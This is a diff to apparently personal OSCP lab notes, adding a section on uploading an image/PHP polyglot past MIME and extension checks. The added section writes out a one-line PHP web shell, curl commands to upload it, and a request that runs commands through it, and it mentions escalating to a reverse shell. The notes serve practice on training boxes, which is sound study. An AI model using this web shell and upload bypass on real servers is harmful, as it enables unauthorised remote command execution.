@@ -126,6 +126,23 @@ curl -s "http://$BoxIP/wp-content/uploads/simple-file-list/module.php?cmd=id"
 - [ ] Upload succeeds but direct GET returns `404` → **Stop before renaming; recheck the upload directory and required plugin fields**
 - [ ] Rename succeeds but PHP does not execute → **Check the directory’s PHP handler and `.htaccess`, then return to the generic upload checks above**
 
+## Image/PHP polyglot with predictable upload naming
+
+When source review shows both a MIME check and a last-extension check, test whether the handler preserves an earlier executable extension. A valid image header followed by a PHP block can satisfy the content check, while a name such as `shell.php.jpg` satisfies a final `.jpg` check. If the handler derives the stored name from the client address, calculate that path before requesting it.
+
+> **Why:** This sequence keeps the file content and multipart filename explicit, then confirms the server-side rename before sending any callback.
+```bash
+printf '%s' 'GIF89a<?php system($_GET["cmd"]); ?>' > "$BoxDir/loot/polyglot.php.jpg"
+curl -sS -i -X POST "http://$BoxIP/upload.php" \
+  -F "myFile=@$BoxDir/loot/polyglot.php.jpg;filename=polyglot.php.jpg" \
+  -F 'submit=go!'
+boxset Path "uploads/$(printf '%s' "$LocalIP" | tr . _).php.jpg"
+curl -sS -G --data-urlencode 'cmd=id' "http://$BoxIP/$Path"
+```
+
+> [!warning] 💡
+> Do not assume the multipart field is named `file`, and do not guess the stored path from the original filename. Read the upload source or response first. Test `id` before a reverse shell.
+
 ## External Resources
 
 | Resource | Link |
@@ -136,6 +153,7 @@ curl -s "http://$BoxIP/wp-content/uploads/simple-file-list/module.php?cmd=id"
 ## Seen in
 - [[OSCP/BOXES/WRITE UPS/Linux/Sea|Sea]] -- confirmed in the box write-up
 - [[OSCP/BOXES/WRITE UPS/Linux/Nukem|Nukem]] -- confirmed in the box write-up
+- [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- image/PHP polyglot bypassed MIME and extension checks
 
 ## Related stages
 
